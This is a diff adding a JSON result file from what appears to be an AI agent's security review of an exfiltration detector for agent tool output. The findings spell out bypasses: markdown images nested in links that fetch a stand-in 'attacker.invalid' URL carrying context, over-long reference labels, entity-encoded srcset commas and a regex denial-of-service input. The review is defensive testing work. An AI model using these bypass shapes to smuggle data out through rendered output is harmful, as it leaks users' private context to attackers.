@@ -1,0 +1,425 @@
+{
+  "contract_version": "1.0.0",
+  "run_id": "T72-review-2026-09-06",
+  "dispatch_id": "233-T72",
+  "status": "DONE_WITH_CONCERNS",
+  "summary": "Independent seventh-round review of T71 (the auto-fetch floor repair). Both dispatched blockers are closed: all nine gate spellings (T66's seven plus a zero-padded and an unquoted one) are flagged and masked at the detector and at all four public boundaries with exact matching preserved and masking still on the raw bytes, and the three CommonMark image forms are covered. Three new blockers: (1) an image nested in a link - the README badge idiom [![alt](URL)](href) - is resolved as a link and its interior skipped, releasing a marked-confirmed auto-fetch at all four boundaries with redaction.state:none, in five spellings; (2) MAX_REFERENCE_LABEL=999 releases a reference image the OLD pattern flagged, so the strict-superset claim is false and the bound is not renderer-faithful (marked resolves 1000- and 1200-character labels); (3) the mandatory floor is quadratic-to-cubic on an unterminated inline destination - 12505 bytes cost 263049.7 ms, and on that shape the shipped code is ~2x slower than the two patterns it replaced, falsifying T71's own performance conclusion. Three majors: the srcset candidate split still parses raw bytes (allowlist-conditional bypass), reference labels are matched byte-exactly where CommonMark collapses internal whitespace, and policies.md's completeness claim is still false. Documentation parity holds in both directions on all 72 list rows and all 14 property rows except that completeness claim. Nothing regressed: nine of eleven prior matrices are byte-identical to T66's own raw logs by SHA-256, the corpus is unchanged at 16 benign files, and the focused suites are 102/0/980. Judgement calls: the performance measurement is honest for the shape measured but over-generalised and the floor still has a pathological input (blocker); the nesting over-approximation past depth 1 is right and honestly labelled (accept); the Version bump is acceptable.",
+  "summary_markdown": null,
+  "acceptance": [
+    {
+      "criterion": "AC5 (AFC-15): no field-name or spelling bypass; a URL secret is masked; a public Markdown link is not treated as a network send",
+      "status": "not_met",
+      "evidence": "Public link and relative destination released and byte-identical at all four boundaries, and the markdown-link-sensitive-value policy is unchanged (T72-boundary.log, T72-gates.log). But spelling bypasses of covered surfaces remain or were introduced: five linked-image spellings and two long-label spellings reach the client with redaction.state:none (T72-boundary.log leakingWithStateNone), plus the srcset entity-comma and label-whitespace spellings (T72-srcset.log, T72-gates.log)."
+    },
+    {
+      "criterion": "Both blockers closed at the detector and at all four public boundaries, with no new bypass, no new benign content flagged and no pathological input inside the floor",
+      "status": "partial",
+      "evidence": "T66#F-001 fully closed (9/9 spellings, hostileFullyClosed:14, exactness negatives released, mask on raw bytes - T72-boundary.log). T66#F-002's three forms closed. No new benign content flagged (corpus 16/16, Part B same 7 ids - T72-rerun-T53-corpus.log). Fails on new bypasses (T72#F-001, T72#F-002) and on pathological input (T72#F-003: 263049.7 ms on 12505 bytes - T72-perf.log)."
+    },
+    {
+      "criterion": "The recorded documentation matches the implementation in both directions",
+      "status": "partial",
+      "evidence": "Re-derived independently: 38 covered + 25 released + 14 property rows all hold in both directions, including case-insensitivity, the three departures from context blindness and what <base href> does. Only the completeness claim fails, on five reverse-completeness rows (T72-doc.log, parity:false)."
+    },
+    {
+      "criterion": "Every verdict row cites the reviewer's own executed probe with a raw log path under .metaproject/data/gdctx/raw/",
+      "status": "met",
+      "evidence": "Nine T72-*.ts probes and twelve T72-rerun-*.log matrices, all executed in this review; SHA-256 of every log recorded in T72-review.md Evidence section."
+    },
+    {
+      "criterion": "Read-only on production, test and documentation files; no git or flow state change",
+      "status": "met",
+      "evidence": "SHA-256 of all nine dispatch-named files identical at start (18:34Z) and end; .T72-hashes-start.txt / .T72-hashes-end.txt diff clean (NO DRIFT). No mutating git command, no stash, no worktree entered."
+    }
+  ],
+  "artifacts": [
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-review.md",
+      "kind": "review",
+      "exists": true,
+      "summary": "Full review: scope, hashes, Stage 1 table, judgement calls, 8 findings, confirmed clean areas, evidence, routing audit."
+    },
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-result.json",
+      "kind": "final-report",
+      "exists": true,
+      "summary": "This file."
+    },
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-md.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "120000-case superset differential fuzz vs a reconstruction of the pre-T71 patterns, plus 21 named marked-oracle rows."
+    },
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-md-diff.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "Targeted old-vs-new differential on long labels and linked images."
+    },
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-boundary.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "27 shapes across dispatchCallTool, prepareOutputForPersistence, validateOutputForTransport and redactToolOutput, plus mask-on-raw-bytes rows."
+    },
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-gates.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "Enumeration of every branch that consults an attribute, plus the markdown sensitive-value gate and reference-label normalisation."
+    },
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-srcset.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "The srcset candidate split against the decoded value, with and without an allowlist."
+    },
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-doc.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "Independent re-derivation of policies.md parity: 77 rows in both directions."
+    },
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-perf.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "Twelve shapes scaled 12.5 KB to 400 KB with growth exponents."
+    },
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-perf2.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "Shipped-vs-replaced ladder on the cubic shape, plus a realistic 40 KB payload."
+    },
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-extra.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "HTMLRewriter decoding-oracle limitation and the real-world badge-row carrier."
+    },
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/data/gdctx/raw/T72-md.log",
+      "kind": "context",
+      "exists": true,
+      "summary": "Raw output of T72-md.ts"
+    },
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/data/gdctx/raw/T72-md-diff.log",
+      "kind": "context",
+      "exists": true,
+      "summary": "Raw output of T72-md-diff.ts"
+    },
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/data/gdctx/raw/T72-boundary.log",
+      "kind": "context",
+      "exists": true,
+      "summary": "Raw output of T72-boundary.ts"
+    },
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/data/gdctx/raw/T72-gates.log",
+      "kind": "context",
+      "exists": true,
+      "summary": "Raw output of T72-gates.ts"
+    },
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/data/gdctx/raw/T72-srcset.log",
+      "kind": "context",
+      "exists": true,
+      "summary": "Raw output of T72-srcset.ts"
+    },
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/data/gdctx/raw/T72-doc.log",
+      "kind": "context",
+      "exists": true,
+      "summary": "Raw output of T72-doc.ts"
+    },
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/data/gdctx/raw/T72-perf.log",
+      "kind": "context",
+      "exists": true,
+      "summary": "Raw output of T72-perf.ts"
+    },
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/data/gdctx/raw/T72-perf2.log",
+      "kind": "context",
+      "exists": true,
+      "summary": "Raw output of T72-perf2.ts"
+    },
+    {
+      "path": "/Users/Goodea/goodea/keryx/.metaproject/data/gdctx/raw/T72-extra.log",
+      "kind": "context",
+      "exists": true,
+      "summary": "Raw output of T72-extra.ts"
+    }
+  ],
+  "changed_files": [
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-review.md",
+      "change": "added (review report)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-result.json",
+      "change": "added (result contract)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-md.ts",
+      "change": "added (review probe)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-md-diff.ts",
+      "change": "added (review probe)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-boundary.ts",
+      "change": "added (review probe)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-gates.ts",
+      "change": "added (review probe)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-srcset.ts",
+      "change": "added (review probe)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-doc.ts",
+      "change": "added (review probe)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-perf.ts",
+      "change": "added (review probe)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-perf2.ts",
+      "change": "added (review probe)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-extra.ts",
+      "change": "added (review probe)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/.T72-hashes-start.txt",
+      "change": "added (drift record)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/.T72-hashes-end.txt",
+      "change": "added (drift record)"
+    }
+  ],
+  "findings": [
+    {
+      "id": "F-001",
+      "global_id": "T72#F-001",
+      "reviewer": "T72-independent-review-security-code+review-logic",
+      "severity": "blocker",
+      "file": "src/security/detect/exfil.ts",
+      "line": 994,
+      "symbol": "detectExfil (inline pass) / readBracketConstructs",
+      "problem": "For `[![alt](URL)](href)` the outer bracket yields two inline readings; `.find` takes the OUTER one, `isImage` is read from the outer bracket's missing `!` so the construct is treated as a click-gated LINK, and `BRACKET_OPEN.lastIndex = inline.end` then advances past the whole construct so the inner `![alt](URL)` is never scanned by either pass. CommonMark renders an image inside a link's text; the detector releases it.",
+      "impact": "`marked` emits <img src=\"https://attacker.invalid/p?ctx=CTX\"> for five measured spellings (inline, in prose, in a list, angle-bracket destination, shortcut/full reference image inside the link) and all five return from dispatchCallTool with isError:false and redaction.state:\"none\", pass prepareOutputForPersistence and validateOutputForTransport byte-identical, and reach the seam with the attacker host present. The carrier is the README badge idiom `[![build](badge)](ci)`, the most common markdown shape there is. Spelling bypass of a surface AC5 requires closed and policies.md:28 declares complete.",
+      "suggested_fix": "Do not let an outer inline construct suppress the interior: when the chosen construct's description contains a `!`-prefixed bracket run, advance BRACKET_OPEN.lastIndex to open+1 rather than inline.end so the interior is rescanned; or prefer the reading whose description contains no nested construct (CommonMark's inner-most-wins for links), which flags the inner image and leaves the outer link click-gated. Add `[![a](U)](L)` to T71_CLASS_VECTORS.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-md.ts -> rendererConfirmedBypasses includes linkedInlineImage, linkedInlineImageNoBang, linkedShortcutImage, linkedFullRefImage, linkedInlineImageProse; raw .metaproject/data/gdctx/raw/T72-md.log (sha256 c9bb139f12cca2e8ecc288560e1957feb128a42c18b72269b452c7e9622a56bb). Boundaries: T72-boundary.ts -> leakingWithStateNone includes x1LinkedInlineImage, x2LinkedShortcutImage, x3LinkedImageInProse; raw T72-boundary.log (sha256 9fca2528a722ce85a32c3cbe69a8d824c30320ae320bd774d3a317a2580255b3). Real-world carrier: T72-extra.log -> badgeRow rendererImgSrcs=[\"https://attacker.invalid/p?ctx=CTX\",\"https://cdn.example.org/cov.svg\"] detectorFindings=0.",
+      "confidence": "high",
+      "dedupe_key": "exfil-image-nested-in-link-released",
+      "blocking_merge": true,
+      "related_skill": "review-security-code",
+      "learning_candidate": true,
+      "class_scope": {
+        "sites": [
+          "src/security/detect/exfil.ts:991-1013 (inline pass, .find + lastIndex advance)",
+          "src/security/detect/exfil.ts:1027-1054 (reference pass, the same inline short-circuit at :1031-1038)",
+          "docs/requirements/keryx-agent-first-core/policies.md:28 (the completeness claim over the four image spellings)"
+        ],
+        "enumeration_method": "Every CommonMark shape in which a covered construct can be CONTAINED by another bracket construct was enumerated (image-in-link, image-in-image, link-in-image) and each driven through `marked` and detectExfil in T72-md.ts / T72-md-diff.ts. image-in-image (`imageInsideImage`) resolves correctly to the outer destination and is NOT a member, so the class is image-in-link in all four image spellings."
+      }
+    },
+    {
+      "id": "F-002",
+      "global_id": "T72#F-002",
+      "reviewer": "T72-independent-review-security-code+review-logic",
+      "severity": "blocker",
+      "file": "src/security/detect/exfil.ts",
+      "line": 565,
+      "symbol": "MAX_REFERENCE_LABEL",
+      "problem": "The 999-character label bound is justified as the standard's, so that refusing a longer label is 'renderer-faithful'. Measured against the markdown oracle this flow uses, it is not: `marked` resolves 1000- and 1200-character labels and emits the <img>. CommonMark's 999 limit is a conformance rule real renderers do not enforce, and the threat model is the rendering client. REFERENCE_DEF (:557) carries no matching bound, so the definition side still builds the entry the use side refuses to look up.",
+      "impact": "Two counts. (1) The strict-SUPERSET claim fails: the old REFERENCE_USE's label group `([^\\]]+)` was unbounded and flagged `![a][<1000 chars>]`; the new scanner releases it, so an over-approximation the old patterns recorded DID vanish — the exact property T71's central argument asserts cannot happen. The 88-case extraction matrix contains no long label, so it could not have caught it. (2) It is the seventh instance of this file's recurring failure mode: a bound placed on the judgement, defeated by writing one more of whatever was bounded. Full, collapsed and shortcut forms are all affected and all reach the client with redaction.state:\"none\" at all four boundaries.",
+      "suggested_fix": "Remove the bound from the classification path — the label is only a Map key, and an over-long key simply fails to match unless a definition of the same over-long label exists, which is precisely the case a renderer fetches. If a bound is kept for the cost reason the comment also gives, apply the SAME bound to REFERENCE_DEF so the two halves agree, and record it as a cost bound whose failure direction is release. No test pins the constant, so removing it breaks nothing.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-md-diff.ts -> supersetRegressions: [label1000, label1200]; rendererConfirmedBypasses additionally [shortcut1000, collapsed1000]; label998 and label999 flagged, so the cliff is exactly at the constant. Raw .metaproject/data/gdctx/raw/T72-md-diff.log (sha256 36735361593bf999cb4fcf1fb58cab9aa597054380b3023a6e9bc73c0eaa8a53). Boundaries: T72-boundary.log -> leakingWithStateNone includes x4LongLabelFullRef, x5LongLabelShortcut.",
+      "confidence": "high",
+      "dedupe_key": "exfil-max-reference-label-bound-releases-and-breaks-superset",
+      "blocking_merge": true,
+      "related_skill": "review-security-code",
+      "learning_candidate": true,
+      "class_scope": {
+        "sites": [
+          "src/security/detect/exfil.ts:565 (MAX_REFERENCE_LABEL, the constant)",
+          "src/security/detect/exfil.ts:611-615 (the `usable` gate, its only reader)",
+          "src/security/detect/exfil.ts:557 (REFERENCE_DEF, the unbounded other half)"
+        ],
+        "enumeration_method": "Every numeric or length bound introduced by T71 was located by reading the new code in full; there is exactly one (MAX_REFERENCE_LABEL). It was then swept at 998/999/1000/1200 characters against `marked` as renderer oracle and against a reconstruction of the pre-T71 REFERENCE_USE pattern, in T72-md-diff.ts."
+      }
+    },
+    {
+      "id": "F-003",
+      "global_id": "T72#F-003",
+      "reviewer": "T72-independent-review-security-code+review-logic",
+      "severity": "blocker",
+      "file": "src/security/detect/exfil.ts",
+      "line": 551,
+      "symbol": "INLINE_DESTINATION",
+      "problem": "`\\(\\s*(?:<([^<>\\n]*)>|([^)\\s]+))[^)]*\\)` backtracks over every split of a run of non-`)` bytes, so one unterminated inline destination is quadratic in the run length. T71 replaced the per-open depth walk with an O(n) bracket index and measured only that shape; the destination grammar was carried over untouched, and the new scanner now offers it a start position at EVERY `[`, where the old `\\[[^\\]]*\\]\\(` had to align first. The two costs multiply.",
+      "impact": "Measured on the shipped detector: `![a](` + a 100 000-byte non-`)` run costs 10 508 ms (growth exponent 1.99); `\"[\".repeat(6250) + \"![a](\" + \"A\".repeat(6250)` — 12 505 bytes — costs 263 049.7 ms (exponent ~3.0); a realistic 40 KB tool output with one unterminated markdown image costs 1 660 ms. On the cubic shape the shipped code is ~2x SLOWER than the two patterns it replaced (1054.5 vs 527.8 ms at 2 KB; 31 703.6 vs 14 395.9 ms at 6 KB). The floor is mandatory, cannot be skipped, and the payload is attacker-chosen: this is denial of service in a security control, and it falsifies T71-implementation Concern 3's two claims.",
+      "suggested_fix": "Gate the destination regex on a cheap precondition before running it: if content.indexOf(\")\", descriptionEnd) is -1 no inline destination can match, so return immediately, and bound the regex's search window to that index. O(1) amortised with the bracket index already built, and it removes both the quadratic and the cubic shape. Then add the unterminated-destination shapes to T71-perf.ts.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-perf.ts -> shapesOverOneSecond: [unterminatedDestination=10508ms, unterminatedDestinationAngle=10182.3ms, openRunThenUnterminated=263049.7ms]; superLinearShapes with exponents 1.99 / 1.93. Raw .metaproject/data/gdctx/raw/T72-perf.log (sha256 7ae822c6cb0c1c8f5ee168f5dffffe6a03380e3ff16db2f9b835e138e6ada8cd). bun .../T72-perf2.ts -> shipped-vs-replaced ladder and realisticPayloadMs: 1660.3; raw T72-perf2.log (sha256 ddf594273c4f2db98749b41a79feef9f14459ce07807df0f5c4395289904a2fa).",
+      "confidence": "high",
+      "dedupe_key": "exfil-inline-destination-catastrophic-backtracking-dos",
+      "blocking_merge": true,
+      "related_skill": "review-security-code",
+      "learning_candidate": true,
+      "class_scope": {
+        "sites": [
+          "src/security/detect/exfil.ts:551 (INLINE_DESTINATION, the only backtracking destination grammar)",
+          "src/security/detect/exfil.ts:588 (its exec, run up to twice per `[` in the input)",
+          "src/security/detect/exfil.ts:557 (REFERENCE_DEF — measured linear, 18.2 ms at 213 KB)",
+          "src/security/detect/exfil.ts:749 (META_REFRESH_CONTENT — terminates in ([\\s\\S]*)$, no backtracking)",
+          "src/security/detect/exfil.ts:642 + readStartTag (measured linear, 13.1 ms at 200 KB)"
+        ],
+        "enumeration_method": "Every regex and every loop in the module was scaled across five sizes from 12.5 KB to 400 KB in T72-perf.ts and the growth exponent computed per shape from the last two measured sizes; the three super-linear shapes are the class and all three are the same sub-pattern."
+      }
+    },
+    {
+      "id": "F-004",
+      "global_id": "T72#F-004",
+      "reviewer": "T72-independent-review-security-code+review-logic",
+      "severity": "major",
+      "file": "src/security/detect/exfil.ts",
+      "line": 1179,
+      "symbol": "detectExfil srcset candidate split",
+      "problem": "T71 closed the decode class at hasAttributeValue — the two gates that read an attribute value as a NAME-like token. The srcset branch reads an attribute value as a GRAMMAR and still parses the raw bytes. A renderer's tokenizer decodes the attribute value first (the very premise the gate fix rests on) and only then runs 'parse a srcset attribute', which splits on commas. So `srcset=\"https://cdn.../a.png&#44;https://attacker.../p 2x\"` is ONE candidate to this detector and TWO to a renderer.",
+      "impact": "Under the empty default allowlist the whole raw string still resolves to the first host and is masked, so the default posture is safe. Under a NON-EMPTY allowlist containing the first candidate's host — the documented remedy for every false positive in this floor and the stated prerequisite for widening the deferred set — the finding disappears and the attacker candidate reaches the client unmasked. Measured on <img srcset> and <source srcset>, decimal and hex spellings.",
+      "suggested_fix": "Split the srcset on decodeCharacterReferences(attribute.value) and map candidate offsets back to the raw span (the raw/classify separation UrlHit.classify already provides for <meta refresh>); or, simpler and in this floor's own direction, when the decoded value contains a comma the raw value does not, classify every decoded candidate and mask the whole attribute value.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-srcset.ts -> three rows verdict=BYPASS with allowlist=[\"cdn.example.org\"], each printing the renderer's two candidates beside the detector's one. Raw .metaproject/data/gdctx/raw/T72-srcset.log (sha256 7957eee55ca5f2f44c88e70806c89d3c370152c09a29ee6560f733abe18514ff).",
+      "confidence": "high",
+      "dedupe_key": "exfil-srcset-split-on-raw-value",
+      "blocking_merge": false,
+      "related_skill": "review-security-code",
+      "learning_candidate": true,
+      "class_scope": {
+        "sites": [
+          "src/security/detect/exfil.ts:1179 (srcset candidate split)",
+          "src/security/detect/exfil.ts:1087 and :1091 (hasAttributeValue — decodes, clean)",
+          "src/security/detect/exfil.ts:1104 (metaRefreshDestination — decodes, clean)",
+          "src/security/detect/exfil.ts:1139 (base/href -> renderableUrl — decodes, clean)",
+          "src/security/detect/exfil.ts:1157 (FETCHING_ATTRIBUTES[attribute.name] — a NAME, which a tokenizer does not decode; confirmed clean)",
+          "src/security/detect/exfil.ts:1094 (empty-value skip — a raw-empty value cannot decode to a non-empty one; clean)"
+        ],
+        "enumeration_method": "detectExfil's HTML loop (exfil.ts:1059-1195) was read line by line and every branch that consults an attribute was turned into a row in T72-gates.ts with the question 'does a renderer decode this before reading it'. Six branches; five are name-keyed or already decode, the srcset split is the one member."
+      }
+    },
+    {
+      "id": "F-005",
+      "global_id": "T72#F-005",
+      "reviewer": "T72-independent-review-security-code+review-logic",
+      "severity": "major",
+      "file": "src/security/detect/exfil.ts",
+      "line": 1042,
+      "symbol": "refs.get(construct.label.trim().toLowerCase())",
+      "problem": "CommonMark's link-label matching normalises with Unicode case folding AND by collapsing consecutive internal whitespace (a newline included) to a single space. The detector normalises with trim().toLowerCase() only, at both the definition side (:974) and the use side (:1042). A use whose label differs from its definition only in internal whitespace resolves for a renderer and not for the floor.",
+      "impact": "`marked` renders <img src=\"https://attacker.invalid/...\"> for `![a][b  c]` against `[b c]: URL`, and for a label carrying a newline, while detectExfil returns 0 findings. Two more cheap spellings of a surface policies.md declares complete. Pre-existing, but T71 rewrote this resolution and re-asserted completeness over it.",
+      "suggested_fix": "Normalise both sides with CommonMark's own rule: label.trim().replace(/\\s+/g, \" \").toLowerCase(), applied identically at :974 and :1042.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-gates.ts -> bypasses includes labelInnerWhitespace:BYPASS and labelNewlineInLabel:BYPASS, each printing marked's emitted <img> beside detectorFindings=0. Raw .metaproject/data/gdctx/raw/T72-gates.log (sha256 adc010a85b6c03d5ca60af5c6f37ba22d416e2582a6424020acfef4bd6f3d83f).",
+      "confidence": "high",
+      "dedupe_key": "exfil-reference-label-whitespace-normalisation",
+      "blocking_merge": false,
+      "related_skill": "review-security-code",
+      "learning_candidate": true,
+      "class_scope": {
+        "sites": [
+          "src/security/detect/exfil.ts:974 (definition side normalisation)",
+          "src/security/detect/exfil.ts:1042 (use side normalisation)"
+        ],
+        "enumeration_method": "CommonMark's link-label matching rule has three components (Unicode case folding, internal-whitespace collapse, entity decoding); each was driven against `marked` and detectExfil in T72-gates.ts. Case folding passes (labelUnicodeCase); whitespace collapse fails at both sites; entity decoding is a non-member because `marked` does not resolve `![a][b&#99;]` either (labelEntitySpelling)."
+      }
+    },
+    {
+      "id": "F-006",
+      "global_id": "T72#F-006",
+      "reviewer": "T72-independent-review-security-code+review-logic",
+      "severity": "major",
+      "file": "docs/requirements/keryx-agent-first-core/policies.md",
+      "line": 28,
+      "symbol": "### Auto-fetch floor: покрытая и непокрытая область (the covered list)",
+      "problem": "T66#F-003(a) allowed the completeness claim to stay only after the spelling gaps were closed. T71 kept «перечень полный, не пример» and widened the markdown entry to «во всех четырёх написаниях CommonMark». Five shapes a reader of that sentence would expect covered are released, four of them renderer-confirmed: an image inside a link in two spellings (T72#F-001), a reference label past 999 characters (T72#F-002), a label differing only by internal whitespace (T72#F-005), and a srcset candidate behind an entity-encoded comma under a non-empty allowlist (T72#F-004). Parts (b) and (c) of T66#F-003 ARE fixed and verified in both directions; this finding is only about (a).",
+      "impact": "The acceptance criterion 'the recorded documentation matches the implementation in both directions' is not met. A normative document that overstates completeness is worse than the silence it replaced, because the next round trusts it instead of re-deriving — which is exactly what happened between T46 and T66.",
+      "suggested_fix": "Fix F-001/F-002/F-004/F-005 and keep the sentence; if any is deferred, replace «перечень полный, не пример» with a named exception list rather than dropping the claim, since the value of the subsection is that it is checkable. The same correction is owed to the module header block (exfil.ts:10-21), which names 'all three CommonMark spellings' with the same gap. Bump Version again when the sentence changes.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-doc.ts -> 77 rows; docSaysReleasedButFlagged: []; propertyFailures: []; docSaysCoveredButReleased: [revLinkedInlineImage, revLinkedShortcutImage, revLongLabelFullRef, revLabelWhitespace, revSrcsetCharrefComma]; parity: false. Raw .metaproject/data/gdctx/raw/T72-doc.log (sha256 88d82662f2d56b6f8a8cb47e7d1850aa10765ba9d10408769a8becbdec2e543d).",
+      "confidence": "high",
+      "dedupe_key": "policies-md-auto-fetch-completeness-still-false",
+      "blocking_merge": false,
+      "related_skill": "review-logic",
+      "learning_candidate": true,
+      "class_scope": {
+        "sites": [
+          "docs/requirements/keryx-agent-first-core/policies.md:28",
+          "src/security/detect/exfil.ts:10-21 (the module header's covered list, T66#F-003's third site)"
+        ],
+        "enumeration_method": "Both lists were transcribed independently from policies.md lines 28/30/32/34/36/38 into 77 executable fragments in T72-doc.ts (38 covered, 25 released, 14 property rows) and put to the detector in both directions; a reverse-completeness block adds every shape this review measured released that the sentence implies is covered."
+      }
+    },
+    {
+      "id": "F-007",
+      "global_id": "T72#F-007",
+      "reviewer": "T72-independent-review-security-code+review-logic",
+      "severity": "minor",
+      "file": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T71-implementation.md",
+      "line": null,
+      "symbol": "Concerns section 3 / 'A performance defect the repair introduced'",
+      "problem": "'The shipped shape is faster than what it replaces on the same input' is true for the one input measured and false for the unterminated-destination shape, where the shipped code is ~2x slower. 'the floor as a whole is still linear-per-file' is false: two measured shapes are quadratic and one is cubic. The module comment at exfil.ts:488-496 repeats the first claim.",
+      "impact": "The disclosure is what the next round will read as the settled measurement, and it would conclude the performance question is closed. Recorded separately from T72#F-003 because that finding is about the code and this is about the artifact a future round inherits.",
+      "suggested_fix": "After T72#F-003 is fixed, restate the claim with the shape it applies to and record the measured growth exponents for the shapes that were not in the original eight.",
+      "evidence": ".metaproject/data/gdctx/raw/T72-perf.log and T72-perf2.log (as T72#F-003).",
+      "confidence": "high",
+      "dedupe_key": "t71-perf-claim-overgeneralised",
+      "blocking_merge": false,
+      "related_skill": "review-logic",
+      "learning_candidate": false
+    },
+    {
+      "id": "F-008",
+      "global_id": "T72#F-008",
+      "reviewer": "T72-independent-review-security-code+review-logic",
+      "severity": "info",
+      "file": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-gates.ts",
+      "line": null,
+      "symbol": "the HTMLRewriter oracle column",
+      "problem": "Measured: Bun's HTMLRewriter (lol-html) returns the RAW attribute source, not the tokenizer's decoded value — getAttribute(\"type\") on type=\"&#105;mage\" returns &#105;mage, and on type=\"&amp;#105;mage\" returns &amp;#105;mage. It is a faithful oracle for attribution (which element owns which attribute) and for tag boundaries, which is what T53 and T66 used it for, but it cannot confirm the character-reference decoding premise that T66#F-001 and this whole repair rest on. That premise is sound and rests on the spec text, not on any oracle in this checkout.",
+      "impact": "None on any verdict here — the premise was stated explicitly wherever this review used it rather than attributed to the oracle. Recorded so the next round does not treat 'an independent HTML tokenizer shipped with the runtime' as settling a decoding question, and so a future decode-related finding is not 'confirmed' by a probe that cannot see decoding at all.",
+      "suggested_fix": "When a decoding question arises, use a full parser (parse5, or Response->DOM) as the oracle, or state the spec clause as the premise; do not report a rewriter's getAttribute as the renderer's value.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-extra.ts -> rows singlePass / doubleEncoded / doubleEncodedMeta. Raw .metaproject/data/gdctx/raw/T72-extra.log (sha256 91d10554beb85cfb50c2afb63ebdf872bbfd84ed8ff2cd51481198506b533248).",
+      "confidence": "high",
+      "dedupe_key": "htmlrewriter-not-a-decoding-oracle",
+      "blocking_merge": false,
+      "related_skill": "review-security-code",
+      "learning_candidate": true
+    }
+  ],
+  "questions": [],
+  "errors": [],
+  "metrics": {
+    "duration_ms": null,
+    "prompt_tokens": null,
+    "output_tokens": null,
+    "retries": null,
+    "probes_written": 9,
+    "matrices_rerun": 12,
+    "matrices_byte_identical_to_T66_logs": 9,
+    "fuzz_cases": 120000,
+    "focused_suites": "102 pass / 0 fail / 980 expect()",
+    "files_under_review_drifted": 0,
+    "blockers": 3,
+    "majors": 3
+  },
+  "timestamp_utc": "2026-09-06T19:01:36.056Z"
+}
